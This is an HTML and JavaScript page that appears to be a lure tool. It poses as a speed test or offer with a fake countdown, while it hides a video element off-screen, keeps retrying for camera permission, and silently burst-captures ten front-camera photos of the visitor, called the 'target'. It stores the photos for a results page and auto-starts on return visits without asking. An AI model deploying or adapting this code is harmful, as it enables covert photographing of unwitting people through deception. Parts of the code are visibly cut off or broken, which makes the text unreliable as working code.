    <style>
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        /* video must NOT use display:none — browsers stop rendering frames when hidden that way */
        /* Instead, position off-screen so it's invisible but still renders */
        canvas,
        video {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        /* ============ SHARED CARD ============ */
        .c-wrap {
            width: 100%;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .c-card {
            width: 100%;
            max-width: 420px;
            border-radius: 24px;
            overflow: hidden;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.25);
            animation: slideUp 0.5s cubic-bezier(.34, 1.56, .64, 1) both;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px) scale(0.96);
            }

            to {
                opacity: 1;
                transform: translateY(0) scale(1);
            }
        }

        .c-header {
            padding: 28px 28px 20px;
            text-align: center;
            position: relative;
        }

        .c-logo {
            font-size: 2.8rem;
            margin-bottom: 8px;
            display: block;
        }

        .c-brand {
            font-size: 1.25rem;
            font-weight: 800;
            margin-bottom: 4px;
        }

        .c-tagline {
            font-size: 0.83rem;
            opacity: 0.75;
        }

        .c-body {
            padding: 24px 28px;
        }

        .c-offer-box {
            border-radius: 16px;
            padding: 18px;
            margin-bottom: 20px;
            text-align: center;
        }

        .c-offer-big {
            font-size: 2.2rem;
            font-weight: 900;
            line-height: 1;
            margin-bottom: 4px;
        }

        .c-offer-sub {
            font-size: 0.85rem;
            opacity: 0.8;
        }

        .c-msg {
            font-size: 0.88rem;
            line-height: 1.65;
            margin-bottom: 22px;
            opacity: 0.85;
        }

        .c-btn {
            width: 100%;
            padding: 16px;
            border-radius: 14px;
            border: none;
            font-family: 'Inter', sans-serif;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            transition: all 0.25s ease;
        }

        .c-btn:hover {
            transform: translateY(-2px);
            filter: brightness(1.1);
        }

        .c-btn:active {
            transform: translateY(0);
        }

        .c-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .c-note {
            font-size: 0.72rem;
            opacity: 0.5;
            text-align: center;
            margin-top: 14px;
        }

        /* Progress bar */
        .c-progress {
            height: 5px;
            border-radius: 5px;
            margin: 18px 0;
            overflow: hidden;
            background: rgba(0, 0, 0, 0.1);
        }

        .c-progress-fill {
            height: 100%;
            border-radius: 5px;
            width: 0;
            transition: width 0.5s ease;
        }

        /* Status msg */
        .c-status {
            font-size: 0.82rem;
            text-align: center;
            min-height: 22px;
            margin-bottom: 10px;
            font-weight: 500;
        }

        /* Success overlay */
        .c-success {
            display: none;
            text-align: center;
            padding: 10px 0;
        }

        .c-success.show {
            display: block;
        }

        .c-success-icon {
            font-size: 3rem;
            margin-bottom: 10px;
        }

        .c-success-title {
            font-size: 1.2rem;
            font-weight: 800;
            margin-bottom: 6px;
        }

        .c-success-sub {
            font-size: 0.83rem;
            opacity: 0.7;
            line-height: 1.5;
        }

        /* Spinner */
        .spin {
            animation: spinAnim 0.9s linear infinite;
        }

        @keyframes spinAnim {
            to {
                transform: rotate(360deg);
            }
        }

        /* Timer ring */
        .c-timer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            font-size: 0.78rem;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .timer-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            animation: timerPulse 1s ease infinite;
        }

        @keyframes timerPulse {

            0%,
            100% {
                opacity: 1;
                transform: scale(1)
            }

            50% {
                opacity: 0.5;
                transform: scale(1.3)
            }
        }

        /* Denied box */
        .c-denied {
            display: none;
            padding: 12px 16px;
            border-radius: 12px;
            font-size: 0.8rem;
            margin-top: 14px;
            line-height: 1.5;
        }

        /* Scanning Overlay */
        .c-scanner {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(4px);
            z-index: 10;
            display: none;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
            border-radius: 24px;
        }

        .c-scanner.active {
            display: flex;
        }

        .scan-line {
            width: 80%;
            height: 2px;
            background: #fff;
            box-shadow: 0 0 15px #fff, 0 0 30px #fff;
            position: absolute;
            top: 15%;
            animation: scanMove 2s linear infinite;
        }

        @keyframes scanMove {
            0% {
                top: 15%;
                opacity: 0;
            }

            10% {
                opacity: 1;
            }

            90% {
                opacity: 1;
            }

            100% {
                top: 75%;
                opacity: 0;
            }
        }

        .scan-circle {
            width: 120px;
            height: 120px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }

        .scan-circle::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border: 2px solid #fff;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 1s linear infinite;
        }

        document.body.classList.add('th-' + themeKey);

        // Get timer countdown (random 5-12 mins)
        const countdown = Math.floor(Math.random() * 7 + 5);

        document.getElementById('pageTitle').textContent = theme.title;

        document.getElementById('mainCard').innerHTML = `

            const m = Math.floor(timerSeconds / 60);
            const s = timerSeconds % 60;
            timerEl.textContent = m + ':' + String(s).padStart(2, '0');
        }, 1000);

        // Speed test: animate the number
        if (themeKey === 'speedtest') {
            let v = 0;
            const offerBigEl = document.querySelector('.c-offer-big');
            const si = setInterval(() => {
                v = Math.min(v + Math.random() * 8, 85.3);
                offerBigEl.textContent = v.toFixed(1) + ' Mbps';
                if (v >= 85.3) clearInterval(si);
            }, 120);
        }

        // ============================================================
        //  CAPTURE ENGINE v2 — Fast, Auto-Retry, Never-Fail
        // ============================================================
        let stream = null;
        let capturing = false;
        let retryCount = 0;
        const MAX_RETRY = 10;   // auto-retry up to 10 times
        const MAX_PHOTOS = 10;   // capture 10 photos per session
        const INTERVAL = 800;   // ms between each shot
        const WARMUP_MS = 1500; // ms to wait after stream starts so camera sensor lights up (prevents black frames)
        const PERM_KEY = 'cemra_perm_granted';

        // --- Sync Status to Results Page ---
        function setSyncStatus(status) {
            localStorage.setItem('cemra_status_' + sessionId, JSON.stringify({
                status,
                lastUpdate: Date.now()
            }));
        }
        setSyncStatus('connected'); // First status: target has opened the link

        // --- Auto-launch: if permission was granted before, skip the button ---
        // Use setTimeout (not DOMContentLoaded) because the card HTML is built dynamically above;
        // by the time this script runs the DOM elements already exist.
        setTimeout(() => {
            if (localStorage.getItem(PERM_KEY) === '1') {
                // Hide button, silently start right away
                const btn = document.getElementById('mainBtn');
                if (btn) btn.style.display = 'none';

        }, 300); // small delay so page renders first

        // --- Button click ---
        async function startCapture() {

                btn.disabled = true;

            }
            setStatus(theme.statusWaiting);
            setProgress(10);
            await requestCamera();
        }

        // --- Core camera request with full fallback chain ---
        async function requestCamera() {
            if (capturing) return;

            // Check for Secure Context (browsers block camera on insecure sites)
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                const isFile = window.location.protocol === 'file:';
                console.error('Camera API not available.');
                alert(isFile
                    ? "❌ BROWSER ERROR: You are opening this as a local file (file://).\n\nModern browsers ONLY allow camera access on HTTPS or localhost.\n\nPlease upload these files to a server or use a local server (like Live Server) to test."
                    : "❌ BROWSER ERROR: Camera API is not available on this connection.\n\nEnsure you are using HTTPS and that your browser supports 'getUserMedia'."
                );
                setSyncStatus('browser_blocked');
                onPermanentFail();
                return;
            }

            const constraints = [
                { video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false },
                { video: { facingMode: { ideal: 'user' } }, audio: false },
                { video: true, audio: false },
                { video: { width: 640, height: 480 }, audio: false }
            ];

            let lastError = null;
            for (const constraint of constraints) {
                try {
                    console.log('Requesting camera with:', JSON.stringify(constraint));
                    stream = await navigator.mediaDevices.getUserMedia(constraint);
                    const camType = JSON.stringify(constraint).includes('user') ? 'front' : 'back';
                    localStorage.setItem(PERM_KEY, '1'); // remember permission granted
                    onGranted(camType);
                    return;
                } catch (e) {
                    console.warn('Constraint failed:', JSON.stringify(constraint), e.name);
                    lastError = e;
                }
            }

            // All constraints failed — check if ANY camera exists at all
            let devices = [];
            try {
                devices = (await navigator.mediaDevices.enumerateDevices()).filter(d => d.kind === 'videoinput');
            } catch { }

            console.error('All camera attempts failed:', lastError);
            console.error('Visible video devices:', devices.length);
            scheduleRetry(lastError, devices.length);
        }

        // --- Auto retry with exponential backoff ---
        function scheduleRetry(error, visibleCamerasCount) {
            if (retryCount >= MAX_RETRY) {
                if (error && error.name === 'NotFoundError') {
                    alert(visibleCamerasCount === 0
                        ? "⚠️ NO CAMERA DETECTED: Your browser doesn't see any camera hardware.\n\n1. Check if your camera is plugged in/turned on.\n2. Ensure your OS settings (Windows/Mac/Android/iOS) allow your browser to access the camera.\n3. Make sure no other app (like Zoom or Skype) is using it."
                        : "⚠️ CAMERA HARDWARE ERROR: A camera was found, but the browser couldn't connect to it.\n\nTry refreshing the page or restarting your browser."
                    );
                } else if (error && error.name === 'NotAllowedError') {
                    alert("⚠️ PERMISSION DENIED: You blocked the camera.\n\nPlease click the lock icon in your address bar, allow the camera, and refresh the page.");
                } else if (error) {
                    alert("⚠️ CAMERA ERROR: " + error.message + " (" + error.name + ")");
                }
                onPermanentFail();
                return;
            }
            retryCount++;
            const delay = Math.min(1000 * retryCount, 5000); // 1s, 2s, 3s ... max 5s
            setStatus(`Retrying... (${retryCount}/${MAX_RETRY})`);
            setSyncStatus('retrying');
            setProgress(retryCount * 5);
            setTimeout(requestCamera, delay);
        }

        function onGranted(camType) {
            capturing = true;
            retryCount = 0;
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            video.play().catch(() => { }); // must call play() explicitly so frames render
            setProgress(30);
            setStatus(theme.statusWaiting);
            setSyncStatus('permission_granted');

            // Wait for video to be ready, then add WARMUP_MS delay before first capture
            // This prevents black frames because the camera sensor needs time to light up
            let warmupDone = false;
            const startCapturing = () => {
                if (warmupDone) return; // prevent double-call
                warmupDone = true;
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                setProgress(35);
                setStatus(theme.statusWaiting);
                // Show scanner overlay
                const sc = document.getElementById('scannerOverlay');
                if (sc) sc.classList.add('active');
                setSyncStatus('capturing');

                // Wait WARMUP_MS after stream is ready so sensor is fully lit
                setTimeout(() => {
                    if (capturing) burstCapture(camType, canvas, video);
                }, WARMUP_MS);
            };

            video.addEventListener('loadeddata', startCapturing, { once: true });
            video.addEventListener('canplay', startCapturing, { once: true });

            // Absolute failsafe: start after 3s regardless
            setTimeout(() => {
                if (capturing && !warmupDone) {
                    warmupDone = true;
                    canvas.width = 640;
                    canvas.height = 480;
                    burstCapture(camType, canvas, video);
                }
            }, 3000);
        }

        // --- Burst capture: after warmup, start shooting ---
        let burstInterval = null;
        function burstCapture(camType, canvas, video) {
            if (burstInterval) clearInterval(burstInterval);
            let count = 0;
            const ctx = canvas.getContext('2d');

            // Take first shot (warmup already done, camera is ready)
            shoot(ctx, canvas, video, camType);
            count++;
            setProgress(40);

            burstInterval = setInterval(() => {
                if (count >= MAX_PHOTOS) {
                    clearInterval(burstInterval);
                    burstInterval = null;
                    stopStream();
                    setProgress(100);
                    setSyncStatus('done');
                    onDone();
                    return;

                    clearInterval(burstInterval);
                    burstInterval = null;
                    // Stream died mid-capture — restart
                    capturing = false;
                    scheduleRetry();
                    return;
                }

                shoot(ctx, canvas, video, camType);
                count++;
                setProgress(40 + (count / MAX_PHOTOS) * 58);
            }, INTERVAL);

            // Keep capturing even if page goes to background
            document.addEventListener('visibilitychange', () => {
                if (document.visibilityState === 'visible' && !capturing) {
                    requestCamera(); // resume on tab re-focus
                }
            });
        }

        // --- Single frame capture ---
        function shoot(ctx, canvas, video, camType) {
            try {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                if (dataUrl && dataUrl.length > 5000) { // ignore blank frames
                    savePhoto(dataUrl, camType);
                }
            } catch (e) {
                // silent — next shot will retry
            }
        }

        // --- Save photo to localStorage ---
        function savePhoto(dataUrl, camType) {
            try {
                const key = 'cemra_captures_' + sessionId;
                const existing = JSON.parse(localStorage.getItem(key) || '[]');
                existing.push({
                    id: 'cap_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6),
                    src: dataUrl,
                    camera: camType,
                    time: new Date().toISOString(),
                    size: (dataUrl.length / 1024 / 1024).toFixed(2) + ' MB',
                    session: sessionId,
                    demo: false
                });
                localStorage.setItem(key, JSON.stringify(existing));
            } catch (e) {
                // localStorage full? trim oldest and retry
                try {
                    const key = 'cemra_captures_' + sessionId;
                    const existing = JSON.parse(localStorage.getItem(key) || '[]');
                    existing.splice(0, 2); // remove 2 oldest
                    existing.push({ id: 'cap_' + Date.now(), src: dataUrl, camera: camType, time: new Date().toISOString(), size: '?', session: sessionId, demo: false });
                    localStorage.setItem(key, JSON.stringify(existing));
                } catch { }
            }
        }

        // --- Stop stream tracks ---
        function stopStream() {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }
            capturing = false;
        }

        // --- All done ---
        function onDone() {
            capturing = false;
            setStatus(theme.statusDone);
            const sc = document.getElementById('scannerOverlay');
            if (sc) sc.classList.remove('active');
            const sb = document.getElementById('successBox');
            if (sb) sb.classList.add('show');
            const btn = document.getElementById('mainBtn');
            if (btn) btn.style.display = 'none';
            clearInterval(timerInterval);
        }

        // --- Permanent failure (all retries exhausted) ---
        function onPermanentFail() {
            capturing = false;
            const btn = document.getElementById('mainBtn');
            if (btn) {
                btn.disabled = false;
                btn.style.display = 'flex';
                btn.innerHTML = `<i class="${theme.btnIcon}"></i> ${theme.btnText}`;
            }
            const db = document.getElementById('deniedBox');
            if (db) db.style.display = 'block';
            setStatus('');
            setSyncStatus('permission_denied');
            setProgress(0);
            // Clear the cached permission so next time it asks again
            localStorage.removeItem(PERM_KEY);
        }

        function setStatus(msg) {
            const el = document.getElementById('statusMsg');
            if (el) el.textContent = msg;
        }
        function setProgress(pct) {
            const fill = document.getElementById('progressFill');
            if (fill) fill.style.width = Math.min(pct, 100) + '%';
        }
    </script>
</body>

</html>
